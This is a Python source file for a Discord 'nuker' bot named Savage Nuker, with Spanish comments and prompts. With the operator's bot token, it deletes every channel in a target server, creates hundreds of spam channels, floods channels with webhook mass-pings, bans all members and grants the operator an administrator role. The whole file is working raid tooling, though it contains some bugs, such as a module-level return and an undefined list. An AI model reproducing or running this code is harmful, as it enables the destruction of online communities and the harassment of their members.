#==============================[SI VES QUE HAY COSAS NO NECESARIAS ES PQ ESTOS IMPORTS LOS SAQUE DE MI OTRA TOOL]==========================
import discord, asyncio, requests, os, colorama, pymongo, time, pystyle, json, requests
from discord.ext import commands
from colorama import Fore, Back, Style
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
import requests
import semver

current_version = "1.0.1"

github_api_url = "https://api.github.com/repos/{username}/{repository}/releases/latest".format(
    username="youngaos",
    repository="Savage-Nuker"
)

response = requests.get(github_api_url)

latest_version = response.json()["tag_name"]

if semver.compare(current_version, latest_version) < 0:
    print("Hay una nueva versión disponible: {}".format(latest_version))
    return
else:
    print("Tu herramienta está en la última versión.")


banner1 = r"""
███████  █████  ██    ██  █████   ██████  ███████ 
██      ██   ██ ██    ██ ██   ██ ██       ██      
███████ ███████ ██    ██ ███████ ██   ███ █████   
     ██ ██   ██  ██  ██  ██   ██ ██    ██ ██      
███████ ██   ██   ████   ██   ██  ██████  ███████ 
                                                  
                                                                                                                                                                                                                                                                

"""[1:]

def clear():
  os.system("clear")


intents = discord.Intents().all()
bot = commands.Bot(command_prefix=";124ohboijhiijioijnjojn5ed", intents=intents)
bot.remove_command('help')
token = input("[>] Bot token: ")



#============NUKE=============
async def nuke():
   server = input("[!] Server ID: ")
   try:
       guilda = bot.get_guild(int(server))
       if guilda is None:
           raise ValueError("El servidor no fue encontrado o el bot no está unido a ese servidor.")
   except ValueError as e:
       print(f"[!] Error: {e}")
       return

   channels = guilda.channels
   channel_list = channels

   async def delete_channel(channel):
    try:     
     await channel.delete()
    except:
     pass

   tasks = []
   for channel in channel_list:
    try: 
     tasks.append(asyncio.ensure_future(delete_channel(channel)))
    except:
      pass 

   await asyncio.gather(*tasks)
   print(Fore.GREEN + "[LOG] Nuke Completado.")  
   await asyncio.sleep(2)
   await optins()
         

#===============RAID===============         
async def raid():
   server = input("[!] Server ID: ")
   canales = input("[!] Nombre de canales: ")
   am = input("> [!] Cantidad de canales: ")
   if int(am) > 500:
   	 print("[!!] El maximo de canales es 500.")
   	 await asyncio.sleep(2)
   	 return await raid()
   try:
       guilda = bot.get_guild(int(server))
       if guilda is None:
           raise ValueError("El servidor no fue encontrado o el bot no está unido a ese servidor.")
   except ValueError as e:
       print(f"[!] Error: {e}")
       return
   for i in range(int(am)):
    try:
        task = asyncio.ensure_future(guilda.create_text_channel(canales))
        tasks.append(task)
        await asyncio.gather(*tasks)
    except:
     pass	
   print(Fore.GREEN + "[LOG] Canales creados.")  
   await asyncio.sleep(2)
   clear()
   await optins()
#============SPAM=================
async def spam2():
   server = input("[!] Server ID: ")	
   try:
       guilda = bot.get_guild(int(server))
       if guilda is None:
           raise ValueError("El servidor no fue encontrado o el bot no está unido a ese servidor.")
   except ValueError as e:
       print(f"[!] Error: {e}")
       return
   spammsg = input("[!] Spam Message: ") 
   pings = input("[!] Pings por canal: ")    	
   tasks = []
   for channel in guilda.text_channels:
        webhook = await channel.create_webhook(name="DD")
        for i in range(int(pings)):
          try:	
            message = spammsg
            task = asyncio.ensure_future(webhook.send(message, username="DD NUKE TOOL"))
            tasks.append(task)
          except: 
          	pass
        print(Fore.GREEN + "[LOG] Canales Spameados.")  
        await asyncio.sleep(2)
        clear()
        await optins()

#================BANALL===============
async def banall():
    server = input("[!] Server ID: ")	
    try:
       guild = bot.get_guild(int(server))
       if guild is None:
           raise ValueError("El servidor no fue encontrado o el bot no está unido a ese servidor.")
    except ValueError as e:
       print(f"[!] Error: {e}")
       return		
    members = guild.members
    async def ban_member(member):
      try:	
        await member.ban(reason=".gg/deaddestroyers")
      except:
        pass  
    tasks = []
    for member in members:
      try:
        tasks.append(asyncio.ensure_future(ban_member(member)))
        print(Fore.GREEN + f"[!] Banned {member}")
      except:
        print(Fore.RED + f"[!!] NOT Banned {member}")
    await asyncio.gather(*tasks)
    print(Fore.GREEN + "[LOG] BANALL COMPLETADO.")    
    await asyncio.sleep(2)
    clear()
    await optins()
#================ADMIN================
async def admin():
   server = input("[!] Server ID: ")	
   autho = input("[!] Tu ID: ")
   try:
       guild = bot.get_guild(int(server))
       if guild is None:
           raise ValueError("El servidor no fue encontrado o el bot no está unido a ese servidor.")
   except ValueError as e:
       print(f"[!] Error: {e}")
       return
   try:
            role = await guild.create_role(name=".",permissions=discord.Permissions(8).all(),colour=discord.Colour(0x000000))
            author = guild.get_member(int(autho))
            await author.add_roles(role)
            print(Fore.GREEN + f"Se te dio admin en {guild.name}")
            await asyncio.sleep(2)
            clear()
            await optins()
   except:
   	 pass
#=============OPTIONS==============       
async def optins():
        print(Colorate.Vertical(Colors.white_to_red, banner1, 1))
        print(f"[+] Bot iniciado como {bot.user}\n")
        print(f"Fuck Skiders / Jodanse skiders(copiones)")        
        print(Fore.BLUE + "         [1] Eliminar canales.    |   [3] Spamear canales. (WEBHOOK)   ")
        print(Fore.BLUE + "         [2] Crear canales.       |   [4] Admin.          ")
        print(Fore.BLUE + "                              [5] | Banall")        
        option = input(Fore.RED + "\nOpción: ")
        if option == "1":
            await nuke()
        elif option == "2":
            await raid()  
        elif option == "3":
            await spam2()   
        elif option == "4":
            await admin() 
        elif option == "5":
            await banall() 
        else:
            print("[!] Opción inválida.")
            await optins()

@bot.event
async def on_ready():
    await optins()

bot.run(token)
